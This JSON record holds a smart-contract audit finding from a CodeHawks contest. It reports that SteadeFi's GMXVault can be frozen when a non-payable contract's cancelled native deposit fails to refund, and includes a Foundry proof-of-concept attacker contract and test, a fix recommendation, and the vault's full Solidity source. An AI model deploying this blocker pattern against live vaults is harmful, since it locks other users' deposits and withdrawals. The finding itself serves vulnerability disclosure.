{
  "Title": "`GMXVault` can be blocked by a malicious actor",
  "Content": "# `GMXVault` can be blocked by a malicious actor\n\n### Severity\nHigh Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXVault.sol#L310-L312\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXVault.sol#L310-L312</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L88\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L88</a>\n\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L209-L210\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L209-L210</a>\n\n\n## Summary\n\n`GMXVault` can be blocked by malicious actor if he made a `depositNative` call with unpayable contract and the deposit then cancelled by the GMX exchange router (3rd party).\n\n## Vulnerability Details\n\n- Users can deposit native tokens in vaults that either of its token pair is a WNT (wrapped native token) by calling `GMXVault.depositNative` payable function with the required deposit parameters (such as token, amount, minimum share amount, slippage & execution fees), then this function will invoke `GMXDeposit.deposit` with a `msg.value` equals the amount that the user wants to deposit + execution fees.\n\n- In `GMXDeposit.deposit`: various checks are made to ensure the sanity of the deposit parameters and the elligibility of the user to deposit, and to calculate the required `tokenA` & `tokenB` needed to deposit in the `GMX` protocol, then the sent native tokens are deposited in the WNT contract and an equivalent amount of WNT is transferred to the vault.\n\n- And before the call is made to the `GMXManager.addLiquidity` (where a call is going to be made to the `GMX.exchangeRouter` contract) to add liquidity; the status of the vault is checked if it's `Open`, if yes; then the status of the vault is set to `Deposit` so that no more deposits or withdrawls can be made (the vault will be blocked until the operation succeeds).\n\n- So if the operation succeeds in the `GMX` exchange router; the vault callback will invoke `preocessDeposit` function to finish the process and update the vault status to `Open`.\n\n- And if the operation of adding liquidity is cancelled by the GMX exchange router (3rd party); the vault callback will invoke `processDepositCancellation` function to rollback the process by repaying the lendingVaults debts and paying back the native tokens sent by the user, then update the vault status to `Open`so that the vault is open again for deposits and withdrawals.\n\n- Usually the deposit (liquidity addition to GMX protocol) fails if the user sets a very high slippage parameter when making a deposit (`dp.slippage`).\n\n**How can this be exploited to block the vault?**\nImagine the following scenario:\n\n1. If a malicious user deploys an **unpayable contract (doesn't receive native tokens)** and makes a call to the `GMXVault.depositNative` function with a very high slippage to ensure that the deposit will be **cancelled** by the GMX exchange router.\n\n2. So when the deposit is cancelled and the vault callback `processDepositCancellation` function is invoked by the router; it will revert as it will try to send back the native tokens to the user who tried to make the deposit (which is the unpayable contract in our case).\n\n3. And the status of the vault will be stuck in the `Deposit` state; so no more deposits or withdrawals can be made and the vault will be disabled.\n\n- The same scenario will happen if the user got blocklisted later by the deposited token contract (tokenA or tokenB), but the propability of this happening is very low as the GMX exchange router will add liquidity in two transactions with a small time separation between them!\n\n## Impact\n\nThe vault will be blocked as it will be stuck in the `Deposit` state; so no more deposits or withdrawals can be made.\n\n## Proof of Concept\n\n#### Code Instances:\n\n[GMXVault.depositNative](https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXVault.sol#L310-L312)\n\n```solidity\n  function depositNative(GMXTypes.DepositParams memory dp) external payable nonReentrant {\n    GMXDeposit.deposit(_store, dp, true);\n  }\n```\n\n[GMXDeposit.deposit /L88](https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L88)\n\n```solidity\n_dc.user = payable(msg.sender);\n```\n\n[GMXDeposit.processDepositCancellation /L209-210](https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXDeposit.sol#L209-L210)\n\n```solidity\n(bool success, ) = self.depositCache.user.call{value: address(this).balance}(\"\");\n      require(success, \"Transfer failed.\");\n```\n\n#### Foundry PoC:\n\n1. A `BlockerContract.sol` is added to mimick the behaviour of an unpayable contract.\n   add the following contract to the `2023-10-SteadeFi/test/gmx/local/BlockerContract.sol` directory:\n\n   ```solidity\n   // SPDX-License-Identifier: MIT\n   pragma solidity 0.8.21;\n\n   import {GMXTypes} from \"../../../contracts/strategy/gmx/GMXTypes.sol\";\n   import {GMXVault} from \"../../../contracts/strategy/gmx/GMXVault.sol\";\n\n   contract BlockerContract {\n       constructor() payable {}\n\n       function callVault(\n           address payable _vaultAddress,\n           GMXTypes.DepositParams memory dp\n       ) external {\n           GMXVault targetVault = GMXVault(_vaultAddress);\n           targetVault.depositNative{value: address(this).balance}(dp);\n       }\n   }\n   ```\n\n2. `test_processDepositCancelWillBlockVault` test is added to to the `2023-10-SteadeFi/test/gmx/local/GMXDepositTest.sol` directory; where the blockerContract is deployed with some native tokens to cover deposit amount + execution fees, then this contract calls the `depositNative` via `BlockerContract.callVault`, where the exchange router tries to cancel the deposit but it will not be able as the BlockerContract can't receive back deposited native tokens, and the vault will be blocked.\n\n   add this import statement and test to the `GMXDepositTest.sol` file :\n\n   ```solidity\n   import {BlockerContract} from \"./BlockerContract.sol\";\n   ```\n\n   ```solidity\n     function test_processDepositCancelWillBlockVault() external {\n           //1. deploy the blockerContract contract with a msg.value=deposit amount + execution fees:\n           uint256 depositAmount = 1 ether;\n\n           BlockerContract blockerContract = new BlockerContract{\n               value: depositAmount + EXECUTION_FEE\n           }();\n\n           //check balance before deposit:\n           uint256 blockerContractEthBalance = address(blockerContract).balance;\n           assertEq(depositAmount + EXECUTION_FEE, blockerContractEthBalance);\n\n           //2. preparing deposit params to call \"depositNative\" via the blockerContract:\n           depositParams.token = address(WETH);\n           depositParams.amt = depositAmount;\n           depositParams.minSharesAmt = 0;\n           depositParams.slippage = SLIPPAGE;\n           depositParams.executionFee = EXECUTION_FEE;\n\n           blockerContract.callVault(payable(address(vault)), depositParams);\n\n           // vault status is \"Deposit\":\n           assertEq(uint256(vault.store().status), 1);\n\n           //3. the blockerContract tries to cancel the deposit, but it will not be able to do beacuse it's unpayable contract:\n           vm.expectRevert();\n           mockExchangeRouter.cancelDeposit(\n               address(WETH),\n               address(USDC),\n               address(vault),\n               address(callback)\n           );\n\n           // vault status will be stuck at \"Deposit\":\n           assertEq(uint256(vault.store().status), 1);\n\n           // check balance after cancelling the deposit, where it will be less than the original as no refund has been paid (the blockerContract is unpayable):\n           assertLt(address(blockerContract).balance, blockerContractEthBalance);\n       }\n   ```\n\n3. Test result:\n\n   ```bash\n   $ forge test --mt test_processDepositCancelWillBlockVault\n   Running 1 test for test/gmx/local/GMXDepositTest.sol:GMXDepositTest\n   [PASS] test_processDepositCancelWillBlockVault() (gas: 1419036)\n   Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 24.62ms\n   Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n   ```\n\n## Tools Used\n\nManual Review & Foundry.\n\n## Recommendations\n\nAdd a mechanism to enable the user from redeeming his cancelled deposits (pulling) instead of sending it back to him (pushing).",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clo38mm260001la08daw5cbuf",
  "Code": [
    {
      "filename": "contracts/strategy/gmx/GMXVault.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { Ownable } from \"@openzeppelin/contracts/access/Ownable.sol\";\nimport { Ownable2Step } from \"@openzeppelin/contracts/access/Ownable2Step.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport { IWNT } from  \"../../interfaces/tokens/IWNT.sol\";\nimport { IGMXVault } from  \"../../interfaces/strategy/gmx/IGMXVault.sol\";\nimport { IGMXVaultEvents } from  \"../../interfaces/strategy/gmx/IGMXVaultEvents.sol\";\nimport { ILendingVault } from  \"../../interfaces/lending/ILendingVault.sol\";\nimport { IChainlinkOracle } from  \"../../interfaces/oracles/IChainlinkOracle.sol\";\nimport { IGMXOracle } from  \"../../interfaces/oracles/IGMXOracle.sol\";\nimport { IExchangeRouter } from \"../../interfaces/protocols/gmx/IExchangeRouter.sol\";\nimport { ISwap } from \"../../interfaces/swap/ISwap.sol\";\nimport { Errors } from  \"../../utils/Errors.sol\";\nimport { GMXTypes } from  \"./GMXTypes.sol\";\nimport { GMXDeposit } from  \"./GMXDeposit.sol\";\nimport { GMXWithdraw } from  \"./GMXWithdraw.sol\";\nimport { GMXRebalance } from  \"./GMXRebalance.sol\";\nimport { GMXCompound } from  \"./GMXCompound.sol\";\nimport { GMXEmergency } from  \"./GMXEmergency.sol\";\nimport { GMXReader } from  \"./GMXReader.sol\";\n\n/**\n  * @title GMXVault\n  * @author Steadefi\n  * @notice Main point of interaction with a Steadefi leveraged strategy vault\n*/\ncontract GMXVault is ERC20, Ownable2Step, ReentrancyGuard, IGMXVault, IGMXVaultEvents {\n\n  /* ==================== STATE VARIABLES ==================== */\n\n  // GMXTypes.Store\n  GMXTypes.Store internal _store;\n\n  /* ======================= MAPPINGS ======================== */\n\n  // Approved keepers\n  mapping(address => bool) public keepers;\n  // Approved tokens for deposit and withdraw\n  mapping(address => bool) public tokens;\n\n  /* ======================= MODIFIERS ======================= */\n\n  // Allow only vault modifier\n  modifier onlyVault() {\n    _onlyVault();\n    _;\n  }\n\n  // Allow only keeper modifier\n  modifier onlyKeeper() {\n    _onlyKeeper();\n    _;\n  }\n\n  /* ====================== CONSTRUCTOR ====================== */\n\n  /**\n    * @notice Initialize and configure vault's store, token approvals and whitelists\n    * @param name Name of vault\n    * @param symbol Symbol for vault token\n    * @param store_ GMXTypes.Store\n  */\n  constructor (\n    string memory name,\n    string memory symbol,\n    GMXTypes.Store memory store_\n  ) ERC20(name, symbol) Ownable(msg.sender) {\n    _store.leverage = uint256(store_.leverage);\n    _store.delta = store_.delta;\n    _store.feePerSecond = uint256(store_.feePerSecond);\n    _store.treasury = address(store_.treasury);\n\n    _store.debtRatioStepThreshold = uint256(store_.debtRatioStepThreshold);\n    _store.debtRatioUpperLimit = uint256(store_.debtRatioUpperLimit);\n    _store.debtRatioLowerLimit = uint256(store_.debtRatioLowerLimit);\n    _store.deltaUpperLimit = int256(store_.deltaUpperLimit);\n    _store.deltaLowerLimit = int256(store_.deltaLowerLimit);\n    _store.minSlippage = store_.minSlippage;\n    _store.minExecutionFee = store_.minExecutionFee;\n\n    _store.tokenA = IERC20(store_.tokenA);\n    _store.tokenB = IERC20(store_.tokenB);\n    _store.lpToken = IERC20(store_.lpToken);\n    _store.WNT = IWNT(store_.WNT);\n\n    _store.tokenALendingVault = ILendingVault(store_.tokenALendingVault);\n    _store.tokenBLendingVault = ILendingVault(store_.tokenBLendingVault);\n\n    _store.vault = IGMXVault(address(this));\n    _store.trove = store_.trove;\n    _store.callback = store_.callback;\n\n    _store.chainlinkOracle = IChainlinkOracle(store_.chainlinkOracle);\n    _store.gmxOracle = IGMXOracle(store_.gmxOracle);\n\n    _store.exchangeRouter = IExchangeRouter(store_.exchangeRouter);\n    _store.router = store_.router;\n    _store.depositVault = store_.depositVault;\n    _store.withdrawalVault = store_.withdrawalVault;\n    _store.roleStore = store_.roleStore;\n\n    _store.swapRouter = ISwap(store_.swapRouter);\n\n    _store.status = GMXTypes.Status.Open;\n\n    _store.lastFeeCollected = block.timestamp;\n\n    // Set token whitelist for this vault\n    tokens[address(_store.tokenA)] = true;\n    tokens[address(_store.tokenB)] = true;\n    tokens[address(_store.lpToken)] = true;\n\n    // Set token approvals for this vault\n    _store.tokenA.approve(address(_store.router), type(uint256).max);\n    _store.tokenB.approve(address(_store.router), type(uint256).max);\n    _store.lpToken.approve(address(_store.router), type(uint256).max);\n\n    _store.tokenA.approve(address(_store.depositVault), type(uint256).max);\n    _store.tokenB.approve(address(_store.depositVault), type(uint256).max);\n\n    _store.lpToken.approve(address(_store.withdrawalVault), type(uint256).max);\n\n    _store.tokenA.approve(address(_store.tokenALendingVault), type(uint256).max);\n    _store.tokenB.approve(address(_store.tokenBLendingVault), type(uint256).max);\n\n    // Set callback contract as keeper\n    keepers[_store.callback] = true;\n  }\n\n  /* ===================== VIEW FUNCTIONS ==================== */\n\n  /**\n    * @notice View vault store data\n    * @return GMXTypes.Store\n  */\n  function store() public view returns (GMXTypes.Store memory) {\n    return _store;\n  }\n\n  /**\n    * @notice Check if token is whitelisted for deposit/withdraw for this vault\n    * @param token Address of token to check\n    * @return Boolean of whether token is whitelisted\n  */\n  function isTokenWhitelisted(address token) public view returns (bool) {\n    return tokens[token];\n  }\n\n  /**\n    * @notice Returns the value of each strategy vault share token; equityValue / totalSupply()\n    * @return svTokenValue  USD value of each share token in 1e18\n  */\n  function svTokenValue() public view returns (uint256) {\n    return GMXReader.svTokenValue(_store);\n  }\n\n  /**\n    * @notice Amount of share pending for minting as a form of management fee\n    * @return pendingFee in 1e18\n  */\n  function pendingFee() public view returns (uint256) {\n    return GMXReader.pendingFee(_store);\n  }\n\n  /**\n    * @notice Conversion of equity value to svToken shares\n    * @param value Equity value change after deposit in 1e18\n    * @param currentEquity Current equity value of vault in 1e18\n    * @return sharesAmt in 1e18\n  */\n  function valueToShares(uint256 value, uint256 currentEquity) public view returns (uint256) {\n    return GMXReader.valueToShares(_store, value, currentEquity);\n  }\n\n  /**\n    * @notice Convert token amount to USD value using price from oracle\n    * @param token Token address\n    * @param amt Amount in token decimals\n    @ @return tokenValue USD value in 1e18\n  */\n  function convertToUsdValue(address token, uint256 amt) public view returns (uint256) {\n    return GMXReader.convertToUsdValue(_store, token, amt);\n  }\n\n  /**\n    * @notice Return token weights (%) in LP\n    @ @return tokenAWeight in 1e18; e.g. 50% = 5e17\n    @ @return tokenBWeight in 1e18; e.g. 50% = 5e17\n  */\n  function tokenWeights() public view returns (uint256, uint256) {\n    return GMXReader.tokenWeights(_store);\n  }\n\n  /**\n    * @notice Returns the total USD value of tokenA & tokenB assets held by the vault\n    * @notice Asset = Debt + Equity\n    * @return assetValue USD value of total assets in 1e18\n  */\n  function assetValue() public view returns (uint256) {\n    return GMXReader.assetValue(_store);\n  }\n\n  /**\n    * @notice Returns the USD value of tokenA & tokenB debt held by the vault\n    * @notice Asset = Debt + Equity\n    * @return tokenADebtValue USD value of tokenA debt in 1e18\n    * @return tokenBDebtValue USD value of tokenB debt in 1e18\n  */\n  function debtValue() public view returns (uint256, uint256) {\n    return GMXReader.debtValue(_store);\n  }\n\n  /**\n    * @notice Returns the USD value of tokenA & tokenB equity held by the vault;\n    * @notice Asset = Debt + Equity\n    * @return equityValue USD value of total equity in 1e18\n  */\n  function equityValue() public view returns (uint256) {\n    return GMXReader.equityValue(_store);\n  }\n\n  /**\n    * @notice Returns the amt of tokenA & tokenB assets held by vault\n    * @return tokenAAssetAmt in tokenA decimals\n    * @return tokenBAssetAmt in tokenB decimals\n  */\n  function assetAmt() public view returns (uint256, uint256) {\n    return GMXReader.assetAmt(_store);\n  }\n\n  /**\n    * @notice Returns the amt of tokenA & tokenB debt held by vault\n    * @return tokenADebtAmt in tokenA decimals\n    * @return tokenBDebtAmt in tokenB decimals\n  */\n  function debtAmt() public view returns (uint256, uint256) {\n    return GMXReader.debtAmt(_store);\n  }\n\n  /**\n    * @notice Returns the amt of LP tokens held by vault\n    * @return lpAmt in 1e18\n  */\n  function lpAmt() public view returns (uint256) {\n    return GMXReader.lpAmt(_store);\n  }\n\n  /**\n    * @notice Returns the current leverage (asset / equity)\n    * @return leverage Current leverage in 1e18\n  */\n  function leverage() public view returns (uint256) {\n    return GMXReader.leverage(_store);\n  }\n\n  /**\n    * @notice Returns the current delta (tokenA equityValue / vault equityValue)\n    * @notice Delta refers to the position exposure of this vault's strategy to the\n    * underlying volatile asset. Delta can be a negative value\n    * @return delta in 1e18 (0 = Neutral, > 0 = Long, < 0 = Short)\n  */\n  function delta() public view returns (int256) {\n    return GMXReader.delta(_store);\n  }\n\n  /**\n    * @notice Returns the debt ratio (tokenA and tokenB debtValue) / (total assetValue)\n    * @notice When assetValue is 0, we assume the debt ratio to also be 0\n    * @return debtRatio % in 1e18\n  */\n  function debtRatio() public view returns (uint256) {\n    return GMXReader.debtRatio(_store);\n  }\n\n  /**\n    * @notice Additional capacity vault that can be deposited to vault based on available lending liquidity\n    @ @return additionalCapacity USD value in 1e18\n  */\n  function additionalCapacity() public view returns (uint256) {\n    return GMXReader.additionalCapacity(_store);\n  }\n\n  /**\n    * @notice Total capacity of vault; additionalCapacity + equityValue\n    @ @return capacity USD value in 1e18\n  */\n  function capacity() public view returns (uint256) {\n    return GMXReader.capacity(_store);\n  }\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice Deposit a whitelisted asset into vault and mint strategy vault share tokens to user\n    * @param dp GMXTypes.DepositParams\n  */\n  function deposit(GMXTypes.DepositParams memory dp) external payable nonReentrant {\n    GMXDeposit.deposit(_store, dp, false);\n  }\n\n  /**\n    * @notice Deposit native asset (e.g. ETH) into vault and mint strategy vault share tokens to user\n    * @notice This function is only function if vault accepts native token\n    * @param dp GMXTypes.DepositParams\n  */\n  function depositNative(GMXTypes.DepositParams memory dp) external payable nonReentrant {\n    GMXDeposit.deposit(_store, dp, true);\n  }\n\n  /**\n    * @notice Withdraws a whitelisted asset from vault and burns strategy vault share tokens from user\n    * @param wp GMXTypes.WithdrawParams\n  */\n  function withdraw(GMXTypes.WithdrawParams memory wp) external payable nonReentrant {\n    GMXWithdraw.withdraw(_store, wp);\n  }\n\n  /**\n    * @notice Emergency withdraw function, enabled only when vault status is Closed, burns\n    svToken from user while withdrawing assets from vault to user\n    * @param shareAmt Amount of vault token shares to withdraw in 1e18\n  */\n  function emergencyWithdraw(uint256 shareAmt) external nonReentrant {\n    GMXEmergency.emergencyWithdraw(_store, shareAmt);\n  }\n\n  /**\n    * @notice Mint vault token shares as management fees to protocol treasury\n  */\n  function mintFee() public {\n    _mint(_store.treasury, GMXReader.pendingFee(_store));\n    _store.lastFeeCollected = block.timestamp;\n  }\n\n  /* ================== INTERNAL FUNCTIONS =================== */\n\n  /**\n    * @notice Allow only vault\n  */\n  function _onlyVault() internal view {\n    if (msg.sender != address(_store.vault)) revert Errors.OnlyVaultAllowed();\n  }\n\n  /**\n    * @notice Allow only keeper\n  */\n  function _onlyKeeper() internal view {\n    if (!keepers[msg.sender]) revert Errors.OnlyKeeperAllowed();\n  }\n\n  /* ================= RESTRICTED FUNCTIONS ================== */\n\n  /**\n    * @notice Post deposit operations if adding liquidity is successful to GMX\n    * @dev Should be called only after deposit() / depositNative() is called\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processDeposit() external onlyKeeper {\n    GMXDeposit.processDeposit(_store);\n  }\n\n  /**\n    * @notice Post deposit operations if adding liquidity has been cancelled by GMX\n    * @dev To be called only after deposit()/depositNative() is called\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processDepositCancellation() external onlyKeeper {\n    GMXDeposit.processDepositCancellation(_store);\n  }\n\n  /**\n    * @notice Post deposit operations if after deposit checks failed by GMXChecks.afterDepositChecks()\n    * @dev Should be called by approved Keeper after error event is picked up\n    * @param slippage Slippage for liquidity removal\n    * @param executionFee Execution fee passed in to remove liquidity\n  */\n  function processDepositFailure(\n    uint256 slippage,\n    uint256 executionFee\n  ) external payable onlyKeeper {\n    GMXDeposit.processDepositFailure(_store, slippage, executionFee);\n  }\n\n  /**\n    * @notice Post deposit failure operations\n    * @dev To be called after processDepositFailure()\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processDepositFailureLiquidityWithdrawal() external onlyKeeper {\n    GMXDeposit.processDepositFailureLiquidityWithdrawal(_store);\n  }\n\n  /**\n    * @notice Post withdraw operations if removing liquidity is successful from GMX\n    * @dev Should be called only after withdraw() is called\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processWithdraw() external onlyKeeper {\n    GMXWithdraw.processWithdraw(_store);\n  }\n\n  /**\n    * @notice Post withdraw operations if removing liquidity has been cancelled by GMX\n    * @dev To be called only after withdraw() is called\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processWithdrawCancellation() external onlyKeeper {\n    GMXWithdraw.processWithdrawCancellation(_store);\n  }\n\n  /**\n    * @notice Post withdraw operations if after withdraw checks failed by GMXChecks.afterWithdrawChecks()\n    * @dev Should be called by approved Keeper after error event is picked up\n    * @param slippage Slippage for liquidity removal\n    * @param executionFee Execution fee passed in to remove liquidity\n  */\n  function processWithdrawFailure(\n    uint256 slippage,\n    uint256 executionFee\n  ) external payable onlyKeeper {\n    GMXWithdraw.processWithdrawFailure(_store, slippage, executionFee);\n  }\n\n  /**\n    * @notice Post withdraw failure operations\n    * @dev To be called after processWithdrawFailure()\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processWithdrawFailureLiquidityAdded() external onlyKeeper {\n    GMXWithdraw.processWithdrawFailureLiquidityAdded(_store);\n  }\n\n  /**\n    * @notice Rebalance vault's delta and/or debt ratio by adding liquidity\n    * @dev Should be called by approved Keeper\n    * @param rap GMXTypes.RebalanceAddParams\n  */\n  function rebalanceAdd(\n    GMXTypes.RebalanceAddParams memory rap\n  ) external payable nonReentrant onlyKeeper {\n    GMXRebalance.rebalanceAdd(_store, rap);\n  }\n\n  /**\n    * @notice Post rebalance add operations if adding liquidity is successful to GMX\n    * @dev To be called after rebalanceAdd()\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processRebalanceAdd() external nonReentrant onlyKeeper {\n    GMXRebalance.processRebalanceAdd(_store);\n  }\n\n  /**\n    * @notice Post rebalance add operations if adding liquidity has been cancelled by GMX\n    * @dev To be called only after rebalanceAdd() is called\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processRebalanceAddCancellation() external nonReentrant onlyKeeper {\n    GMXRebalance.processRebalanceAddCancellation(_store);\n  }\n\n  /**\n    * @notice Rebalance vault's delta and/or debt ratio by removing liquidity\n    * @dev Should be called by approved Keeper\n    * @param rrp GMXTypes.RebalanceRemoveParams\n  */\n  function rebalanceRemove(\n    GMXTypes.RebalanceRemoveParams memory rrp\n  ) external payable nonReentrant onlyKeeper {\n    GMXRebalance.rebalanceRemove(_store, rrp);\n  }\n\n  /**\n    * @notice Post rebalance remove operations if removing liquidity is successful to GMX\n    * @dev To be called after rebalanceRemove()\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processRebalanceRemove() external onlyKeeper {\n    GMXRebalance.processRebalanceRemove(_store);\n  }\n\n  /**\n    * @notice Post rebalance remove operations if removing liquidity has been cancelled by GMX\n    * @dev To be called only after rebalanceRemove() is called\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processRebalanceRemoveCancellation() external nonReentrant onlyKeeper {\n    GMXRebalance.processRebalanceRemoveCancellation(_store);\n  }\n\n  /**\n    * @notice Compounds ERC20 token rewards and convert to more LP\n    * @dev Assumes that reward tokens are already in vault\n    * @dev Should be called by approved Keeper\n    * @param cp GMXTypes.CompoundParams\n  */\n  function compound(GMXTypes.CompoundParams memory cp) external payable onlyKeeper {\n    GMXCompound.compound(_store, cp);\n  }\n\n  /**\n    * @notice Post compound operations if adding liquidity is successful to GMX\n    * @dev To be called after processCompound()\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processCompound() external onlyKeeper {\n    GMXCompound.processCompound(_store);\n  }\n\n  /**\n    * @notice Post compound operations if adding liquidity has been cancelled by GMX\n    * @dev To be called after processCompound()\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processCompoundCancellation() external onlyKeeper {\n    GMXCompound.processCompoundCancellation(_store);\n  }\n\n  /**\n    * @notice Withdraws LP for all underlying assets to vault and set vault status to Paused\n    * @dev To be called only in an emergency situation. Can be called in ANY vault status\n    * @dev Should be called by approved Keeper\n  */\n  function emergencyPause() external payable onlyKeeper {\n    GMXEmergency.emergencyPause(_store);\n  }\n\n  /**\n    * @notice Re-add all assets for liquidity for LP in anticipation of vault resuming\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n  */\n  function emergencyResume() external payable onlyOwner {\n    GMXEmergency.emergencyResume(_store);\n  }\n\n  /**\n    * @notice Post emergency resume operations if re-adding liquidity is successful\n    * @dev To be called after emergencyResume()\n    * @dev Should be called by approved vault's Callback or approved Keeper\n  */\n  function processEmergencyResume() external payable onlyKeeper {\n    GMXEmergency.processEmergencyResume(_store);\n  }\n\n  /**\n    * @notice Repays all debt owed by vault and shut down vault, allowing emergency withdrawals\n    * @dev Note that this is a one-way irreversible action\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param deadline Timestamp of swap deadline\n  */\n  function emergencyClose(uint256 deadline) external onlyOwner {\n    GMXEmergency.emergencyClose(_store, deadline);\n  }\n\n  /**\n    * @notice Approve or revoke address to be a keeper for this vault\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param keeper Keeper address\n    * @param approval Boolean to approve keeper or not\n  */\n  function updateKeeper(address keeper, bool approval) external onlyOwner {\n    keepers[keeper] = approval;\n    emit KeeperUpdated(keeper, approval);\n  }\n\n  /**\n    * @notice Update treasury address\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param treasury Treasury address\n  */\n  function updateTreasury(address treasury) external onlyOwner {\n    _store.treasury = treasury;\n    emit TreasuryUpdated(treasury);\n  }\n\n  /**\n    * @notice Update swap router address\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param swapRouter Swap router address\n  */\n  function updateSwapRouter(address swapRouter) external onlyOwner {\n    _store.swapRouter = ISwap(swapRouter);\n    emit SwapRouterUpdated(swapRouter);\n  }\n\n  /**\n    * @notice Update trove address\n    * @dev Should only be called once on vault initialization\n    * @param trove Trove address\n  */\n  function updateTrove(address trove) external onlyOwner {\n    _store.trove = trove;\n    emit TroveUpdated(trove);\n  }\n\n  /**\n    * @notice Update callback address\n    * @dev Should only be called once on vault initialization\n    * @param callback Callback address\n  */\n  function updateCallback(address callback) external onlyOwner {\n    _store.callback = callback;\n    emit CallbackUpdated(callback);\n  }\n\n  /**\n    * @notice Update management fee per second\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param feePerSecond fee per second in 1e18\n  */\n  function updateFeePerSecond(uint256 feePerSecond) external onlyOwner {\n    _store.feePerSecond = feePerSecond;\n    emit FeePerSecondUpdated(feePerSecond);\n  }\n\n  /**\n    * @notice Update strategy parameter limits and guard checks\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param debtRatioStepThreshold threshold change for debt ratio allowed in 1e4\n    * @param debtRatioUpperLimit upper limit of debt ratio in 1e18\n    * @param debtRatioLowerLimit lower limit of debt ratio in 1e18\n    * @param deltaUpperLimit upper limit of delta in 1e18\n    * @param deltaLowerLimit lower limit of delta in 1e18\n  */\n  function updateParameterLimits(\n    uint256 debtRatioStepThreshold,\n    uint256 debtRatioUpperLimit,\n    uint256 debtRatioLowerLimit,\n    int256 deltaUpperLimit,\n    int256 deltaLowerLimit\n  ) external onlyOwner {\n    _store.debtRatioStepThreshold = debtRatioStepThreshold;\n    _store.debtRatioUpperLimit = debtRatioUpperLimit;\n    _store.debtRatioLowerLimit = debtRatioLowerLimit;\n    _store.deltaUpperLimit = deltaUpperLimit;\n    _store.deltaLowerLimit = deltaLowerLimit;\n\n    emit ParameterLimitsUpdated(\n      debtRatioStepThreshold,\n      debtRatioUpperLimit,\n      debtRatioLowerLimit,\n      deltaUpperLimit,\n      deltaLowerLimit\n    );\n  }\n\n  /**\n    * @notice Update minimum slippage\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param minSlippage minimum slippage value in 1e4\n  */\n  function updateMinSlippage(uint256 minSlippage) external onlyOwner {\n    _store.minSlippage = minSlippage;\n    emit MinSlippageUpdated(minSlippage);\n  }\n\n  /**\n    * @notice Update minimum execution fee for GMX\n    * @dev Should be called by approved Owner (Timelock + MultiSig)\n    * @param minExecutionFee minimum execution fee value in 1e18\n  */\n  function updateMinExecutionFee(uint256 minExecutionFee) external onlyOwner {\n    _store.minExecutionFee = minExecutionFee;\n    emit MinExecutionFeeUpdated(minExecutionFee);\n  }\n\n  /**\n    * @notice Mints vault token shares to user\n    * @dev Should only be called by vault\n    * @param to Receiver of the minted vault tokens\n    * @param amt Amount of minted vault tokens\n  */\n  function mint(address to, uint256 amt) external onlyVault {\n    _mint(to, amt);\n  }\n\n  /**\n    * @notice Burns vault token shares from user\n    * @dev Should only be called by vault\n    * @param to Address's vault tokens to burn\n    * @param amt Amount of vault tokens to burn\n  */\n  function burn(address to, uint256 amt) external onlyVault {\n    _burn(to, amt);\n  }\n\n  /* ================== FALLBACK FUNCTIONS =================== */\n\n  /**\n    * @notice Fallback function to receive native token sent to this contract\n    * @dev To refund refundee any ETH received from GMX for unused execution fees\n  */\n  receive() external payable {\n    if (msg.sender == _store.depositVault || msg.sender == _store.withdrawalVault) {\n      (bool success, ) = _store.refundee.call{value: address(this).balance}(\"\");\n      require(success, \"Transfer failed.\");\n    }\n  }\n}"
    },
    {
